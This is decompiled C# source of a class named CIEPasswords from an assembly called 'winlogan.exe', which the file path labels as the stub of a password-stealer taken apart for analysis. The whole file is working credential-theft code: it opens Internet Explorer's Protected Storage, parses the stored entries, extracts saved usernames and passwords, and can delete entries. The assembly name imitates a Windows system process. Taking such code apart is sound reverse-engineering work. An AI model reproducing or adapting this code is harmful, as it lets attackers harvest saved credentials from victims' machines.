// Decompiled with JetBrains decompiler
// Type: CIEPasswords
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using PStoreLib;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal class CIEPasswords : IEnumerable<CIEPassword>
{
  private readonly Guid guidIE;
  private CProtectStore m_PStore;
  private PST_KEY m_KeyType;
  private List<CIEPassword> m_IEPass;
  [SpecialName]
  private CIEPasswords.FILETIME \u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lft;
  [SpecialName]
  private CIEPasswords.SYSTEMTIME \u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst;

  public PST_KEY KeyType
  {
    get
    {
      return this.m_KeyType;
    }
    set
    {
      this.m_KeyType = value;
      this.m_PStore.KeyType = value;
    }
  }

  public CIEPasswords()
  {
    this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
    this.m_PStore = new CProtectStore();
    this.m_IEPass = new List<CIEPassword>();
  }

  [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern void CopyMemory(IntPtr Destination, IntPtr Source, int Length);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int lstrlenA(IntPtr lpString);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FileTimeToLocalFileTime(ref CIEPasswords.FILETIME lpFileTime, ref CIEPasswords.FILETIME lpLocalFileTime);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FileTimeToSystemTime(ref CIEPasswords.FILETIME lpFileTime, ref CIEPasswords.SYSTEMTIME lpSystemTime);

  private DateTime FileTimeToDate(ref CIEPasswords.FILETIME ftDateTime)
  {
    CIEPasswords.FileTimeToLocalFileTime(ref ftDateTime, ref this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lft);
    CIEPasswords.FileTimeToSystemTime(ref this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lft, ref this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst);
    return DateTime.FromOADate(DateAndTime.DateSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wYear, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wMonth, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wDay).ToOADate() + DateAndTime.TimeSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wHour, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wMinute, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201112D10112C\u0024lst.wSecond).ToOADate());
  }

  private void AddPasswdInfo(string strRess)
  {
    CIEPasswords.StringIndexEntry stringIndexEntry1;
    int num1 = Strings.Len((object) stringIndexEntry1);
    CIEPasswords.StringIndexHeader stringIndexHeader1;
    Strings.Len((object) stringIndexHeader1);
    byte[] numArray1 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringData");
    byte[] numArray2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringIndex");
    GCHandle gcHandle1 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
    IntPtr ptr1 = gcHandle1.AddrOfPinnedObject();
    object obj1 = Marshal.PtrToStructure(ptr1, stringIndexHeader1.GetType());
    CIEPasswords.StringIndexHeader stringIndexHeader2;
    CIEPasswords.StringIndexHeader stringIndexHeader3 = obj1 != null ? (CIEPasswords.StringIndexHeader) obj1 : stringIndexHeader2;
    gcHandle1.Free();
    GCHandle gcHandle2 = GCHandle.Alloc((object) numArray1, GCHandleType.Pinned);
    GCHandle gcHandle3 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
    IntPtr num2 = gcHandle2.AddrOfPinnedObject();
    // ISSUE: explicit reference operation
    // ISSUE: variable of a reference type
    IntPtr& local = @ptr1;
    IntPtr ptr2 = gcHandle3.AddrOfPinnedObject();
    int num3 = checked (ptr2.ToInt32() + stringIndexHeader3.dwStructSize);
    // ISSUE: explicit reference operation
    ^local = new IntPtr(num3);
    CIEPasswords.StringIndexEntry stringIndexEntry2;
    if (stringIndexHeader3.dwType == 1)
    {
      if (stringIndexHeader3.dwEntriesCount >= 2)
      {
        int num4 = 0;
        int num5 = checked (stringIndexHeader3.dwEntriesCount - 1);
        int num6 = num4;
        while (num6 <= num5)
        {
          if (num2 == IntPtr.Zero | ptr1 == IntPtr.Zero)
            return;
          CIEPasswords.StringIndexEntry stringIndexEntry3;
          object obj2 = Marshal.PtrToStructure(ptr1, stringIndexEntry3.GetType());
          stringIndexEntry3 = obj2 != null ? (CIEPasswords.StringIndexEntry) obj2 : stringIndexEntry2;
          IntPtr num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
          string szUserName;
          if (CIEPasswords.lstrlenA(num7) != stringIndexEntry3.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringAnsi(num7);
          }
          ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
          object obj3 = Marshal.PtrToStructure(ptr1, stringIndexEntry3.GetType());
          stringIndexEntry3 = obj3 != null ? (CIEPasswords.StringIndexEntry) obj3 : stringIndexEntry2;
          num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
          string szPasswd;
          if (CIEPasswords.lstrlenA(num7) != stringIndexEntry3.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szPasswd = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szPasswd = Marshal.PtrToStringAnsi(num7);
          }
          ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
          this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, szPasswd, this.FileTimeToDate(ref stringIndexEntry3.ftInsertDateTime), 1));
          checked { num6 += 2; }
        }
      }
    }
    else if (stringIndexHeader3.dwType == 0)
    {
      if (num2 == IntPtr.Zero | ptr1 == IntPtr.Zero)
        return;
      int num4 = 0;
      int num5 = checked (stringIndexHeader3.dwEntriesCount - 1);
      int num6 = num4;
      while (num6 <= num5)
      {
        CIEPasswords.StringIndexEntry stringIndexEntry3;
        object obj2 = Marshal.PtrToStructure(ptr1, stringIndexEntry3.GetType());
        stringIndexEntry3 = obj2 != null ? (CIEPasswords.StringIndexEntry) obj2 : stringIndexEntry2;
        Strings.Space(stringIndexEntry3.dwDataSize);
        IntPtr num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
        string szUserName;
        if (CIEPasswords.lstrlenA(num7) != stringIndexEntry3.dwDataSize)
        {
          ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
          szUserName = Marshal.PtrToStringUni(ptr2);
        }
        else
        {
          num7 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
          szUserName = Marshal.PtrToStringAnsi(num7);
        }
        ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
        this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, string.Empty, this.FileTimeToDate(ref stringIndexEntry3.ftInsertDateTime), 0));
        checked { ++num6; }
      }
    }
    gcHandle2.Free();
    gcHandle3.Free();
  }

  public void DeletePart(string szResourceName, string szWord)
  {
    CIEPasswords.StringIndexEntry stringIndexEntry1;
    int num1 = Strings.Len((object) stringIndexEntry1);
    CIEPasswords.StringIndexHeader stringIndexHeader1;
    int num2 = Strings.Len((object) stringIndexHeader1);
    byte[] numArray1 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
    byte[] numArray2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
    GCHandle gcHandle1 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
    IntPtr ptr1 = gcHandle1.AddrOfPinnedObject();
    object obj1 = Marshal.PtrToStructure(ptr1, stringIndexHeader1.GetType());
    CIEPasswords.StringIndexHeader stringIndexHeader2;
    CIEPasswords.StringIndexHeader stringIndexHeader3 = obj1 != null ? (CIEPasswords.StringIndexHeader) obj1 : stringIndexHeader2;
    gcHandle1.Free();
    GCHandle gcHandle2 = GCHandle.Alloc((object) numArray1, GCHandleType.Pinned);
    GCHandle gcHandle3 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
    gcHandle2.AddrOfPinnedObject();
    // ISSUE: explicit reference operation
    // ISSUE: variable of a reference type
    IntPtr& local1 = @ptr1;
    IntPtr ptr2 = gcHandle3.AddrOfPinnedObject();
    int num3 = checked (ptr2.ToInt32() + stringIndexHeader3.dwStructSize);
    // ISSUE: explicit reference operation
    ^local1 = new IntPtr(num3);
    if (stringIndexHeader3.dwType == 1 | stringIndexHeader3.dwEntriesCount == 1)
      this.Delete(szResourceName);
    else if (stringIndexHeader3.dwType == 0)
    {
      byte[] numArray3 = new byte[checked (Information.UBound((Array) numArray1, 1) + 1)];
      byte[] numArray4 = new byte[checked (Information.UBound((Array) numArray2, 1) + 1)];
      GCHandle gcHandle4 = GCHandle.Alloc((object) numArray3, GCHandleType.Pinned);
      GCHandle gcHandle5 = GCHandle.Alloc((object) numArray4, GCHandleType.Pinned);
      IntPtr num4 = gcHandle2.AddrOfPinnedObject();
      ptr1 = new IntPtr(checked (gcHandle3.AddrOfPinnedObject().ToInt32() + stringIndexHeader3.dwStructSize));
      IntPtr num5 = gcHandle4.AddrOfPinnedObject();
      IntPtr ptr3;
      // ISSUE: explicit reference operation
      // ISSUE: variable of a reference type
      IntPtr& local2 = @ptr3;
      IntPtr num6 = gcHandle5.AddrOfPinnedObject();
      int num7 = checked (num6.ToInt32() + stringIndexHeader3.dwStructSize);
      // ISSUE: explicit reference operation
      ^local2 = new IntPtr(num7);
      int num8 = 0;
      int num9 = checked (stringIndexHeader3.dwEntriesCount - 1);
      int num10 = num8;
      int pcbBuff;
      while (num10 <= num9)
      {
        CIEPasswords.StringIndexEntry stringIndexEntry2;
        object obj2 = Marshal.PtrToStructure(ptr1, stringIndexEntry2.GetType());
        CIEPasswords.StringIndexEntry stringIndexEntry3;
        stringIndexEntry2 = obj2 != null ? (CIEPasswords.StringIndexEntry) obj2 : stringIndexEntry3;
        Strings.Space(stringIndexEntry2.dwDataSize);
        num6 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
        if (CIEPasswords.lstrlenA(num6) != stringIndexEntry2.dwDataSize)
        {
          ptr2 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
          if (Operators.CompareString(Marshal.PtrToStringUni(ptr2, checked (stringIndexEntry2.dwDataSize * 2)), szWord, false) != 0)
          {
            num6 = new IntPtr(checked (num5.ToInt32() + pcbBuff));
            IntPtr Destination = num6;
            ptr2 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            IntPtr Source = ptr2;
            int Length = checked (stringIndexEntry2.dwDataSize * 2);
            CIEPasswords.CopyMemory(Destination, Source, Length);
            stringIndexEntry2.dwDataOffset = pcbBuff;
            Marshal.StructureToPtr((object) stringIndexEntry2, ptr3, false);
            pcbBuff = checked (pcbBuff + stringIndexEntry2.dwDataSize * 2 + 2);
            ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
          }
        }
        else
        {
          num6 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
          if (Operators.CompareString(Marshal.PtrToStringAnsi(num6, checked (stringIndexEntry2.dwDataSize * 2)), szWord, false) != 0)
          {
            num6 = new IntPtr(checked (num5.ToInt32() + pcbBuff));
            IntPtr Destination = num6;
            ptr2 = new IntPtr(checked (num4.ToInt32() + stringIndexEntry2.dwDataOffset));
            IntPtr Source = ptr2;
            int Length = stringIndexEntry2.dwDataSize;
            CIEPasswords.CopyMemory(Destination, Source, Length);
            stringIndexEntry2.dwDataOffset = pcbBuff;
            Marshal.StructureToPtr((object) stringIndexEntry2, ptr3, false);
            pcbBuff = checked (pcbBuff + stringIndexEntry2.dwDataSize + 1);
            ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
          }
        }
        ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
        checked { ++num10; }
      }
      stringIndexHeader3.dwEntriesCount = checked (stringIndexHeader3.dwEntriesCount - 1);
      Marshal.StructureToPtr((object) stringIndexHeader3, ptr3, false);
      this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringData", num5.ToInt32(), pcbBuff);
      this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex", ptr3.ToInt32(), checked (num2 + stringIndexHeader3.dwEntriesCount * num1));
      gcHandle4.Free();
      gcHandle5.Free();
    }
    gcHandle2.Free();
    gcHandle3.Free();
  }

  public void Delete(string szResourceName)
  {
    this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
    this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
  }

  public void Refresh()
  {
    this.m_IEPass.Clear();
    CItems citems = this.m_PStore.get_Items(this.guidIE, this.guidIE);
    if (citems == null)
      return;
    int num = 0;
    try
    {
      foreach (CItem citem in citems)
      {
        if (num % 2 == 0)
          this.AddPasswdInfo(Strings.Mid(citem.Name, 1, checked (Strings.InStr(citem.Name, ":String", CompareMethod.Binary) - 1)));
        checked { ++num; }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public IEnumerator<CIEPassword> GetEnumerator()
  {
    this.Refresh();
    return (IEnumerator<CIEPassword>) this.m_IEPass.GetEnumerator();
  }

  public IEnumerator GetEnumerator1()
  {
    this.Refresh();
    return (IEnumerator) this.m_IEPass.GetEnumerator();
  }

  private struct StringIndexHeader
  {
    public int dwWICK;
    public int dwStructSize;
    public int dwEntriesCount;
    public int dwUnkId;
    public int dwType;
    public int dwUnk;
  }

  private struct FILETIME
  {
    public int dwLow;
    public int dwHigh;
  }

  private struct StringIndexEntry
  {
    public int dwDataOffset;
    public CIEPasswords.FILETIME ftInsertDateTime;
    public int dwDataSize;
  }

  [StructLayout(LayoutKind.Sequential, Pack = 2)]
  private struct SYSTEMTIME
  {
    public short wYear;
    public short wMonth;
    public short wDayOfWeek;
    public short wDay;
    public short wHour;
    public short wMinute;
    public short wSecond;
    public short wMilliseconds;
  }

  private struct IEPass
  {
    public int dwType;
    public string strResource;
    public string strUserName;
    public string strPassword;
    public DateTime ftAddDate;
  }
}
